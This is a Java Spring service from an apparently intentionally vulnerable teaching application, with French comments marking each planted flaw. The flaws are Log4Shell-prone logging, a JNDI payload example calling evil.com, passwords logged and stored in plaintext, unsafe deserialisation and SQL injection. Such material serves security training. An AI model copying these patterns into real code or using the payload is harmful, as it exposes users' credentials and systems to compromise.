package com.example.vulnerable.service;

import com.example.vulnerable.model.User;
import com.example.vulnerable.repository.UserRepository;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.io.*;
import java.util.Base64;
import java.util.List;

/**
 * Service de gestion des utilisateurs.
 * 
 * VULNÉRABILITÉS INTENTIONNELLES :
 * - Log Injection (Log4Shell potentiel)
 * - Insecure Deserialization
 * - Exposition de données sensibles dans les logs
 * - Pas de hachage des mots de passe
 */
@Service
@Transactional
public class UserService {

    // VULNÉRABILITÉ : Log4j 2.14.1 vulnérable à Log4Shell
    private static final Logger logger = LogManager.getLogger(UserService.class);

    @Autowired
    private UserRepository userRepository;

    /**
     * VULNÉRABLE : Log Injection
     * Un attaquant peut injecter ${jndi:ldap://evil.com/exploit}
     */
    public User login(String username, String password) {
        // VULNÉRABILITÉ : Log injection - données utilisateur loguées directement
        logger.info("Tentative de connexion pour l'utilisateur: " + username);
        
        User user = userRepository.authenticateUnsafe(username, password);
        
        if (user != null) {
            // VULNÉRABILITÉ : Exposition de données sensibles dans les logs
            logger.info("Connexion réussie: " + user.toString());
            return user;
        } else {
            // VULNÉRABILITÉ : Information sur l'échec révélée
            logger.warn("Échec de connexion pour: " + username + " avec mot de passe: " + password);
            return null;
        }
    }

    /**
     * VULNÉRABLE : Mot de passe stocké en clair
     */
    public User register(User user) {
        // VULNÉRABILITÉ : Pas de hachage du mot de passe !
        // Le mot de passe est stocké tel quel
        
        // VULNÉRABILITÉ : Log des données sensibles
        logger.info("Nouvel utilisateur enregistré: " + user.toString());
        
        user.setActive(true);
        user.setRole("USER");
        if (user.getBalance() == null) {
            user.setBalance(0.0);
        }
        
        return userRepository.save(user);
    }

    /**
     * VULNÉRABLE : Insecure Deserialization
     * Un attaquant peut créer un payload sérialisé malveillant
     */
    public User deserializeUser(String base64Data) {
        try {
            byte[] data = Base64.getDecoder().decode(base64Data);
            ByteArrayInputStream bais = new ByteArrayInputStream(data);
            
            // VULNÉRABILITÉ : Désérialisation non sécurisée
            // Accepte n'importe quel objet sérialisé sans validation
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object obj = ois.readObject();
            ois.close();
            
            if (obj instanceof User) {
                return (User) obj;
            }
        } catch (Exception e) {
            // VULNÉRABILITÉ : Stack trace exposée
            logger.error("Erreur de désérialisation", e);
        }
        return null;
    }

    /**
     * Sérialise un utilisateur (pour export)
     */
    public String serializeUser(User user) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(user);
            oos.close();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        } catch (Exception e) {
            logger.error("Erreur de sérialisation", e);
            return null;
        }
    }

    public User findById(Long id) {
        return userRepository.findById(id).orElse(null);
    }

    public User findByUsername(String username) {
        return userRepository.findByUsernameUnsafe(username);
    }

    public List<User> searchUsers(String searchTerm) {
        // VULNÉRABILITÉ : Injection SQL propagée
        return userRepository.searchUsersUnsafe(searchTerm);
    }

    public List<User> getAllUsers() {
        return userRepository.findAll();
    }

    public User updateUser(User user) {
        return userRepository.save(user);
    }

    public void deleteUser(Long id) {
        userRepository.findById(id).ifPresent(userRepository::delete);
    }

    /**
     * VULNÉRABLE : Mise à jour du solde sans validation
     */
    public void updateBalance(Long userId, String amount) {
        // VULNÉRABILITÉ : amount non validé, injection SQL possible
        userRepository.updateBalanceUnsafe(userId, amount);
        logger.info("Solde mis à jour pour user " + userId + ": " + amount);
    }
}
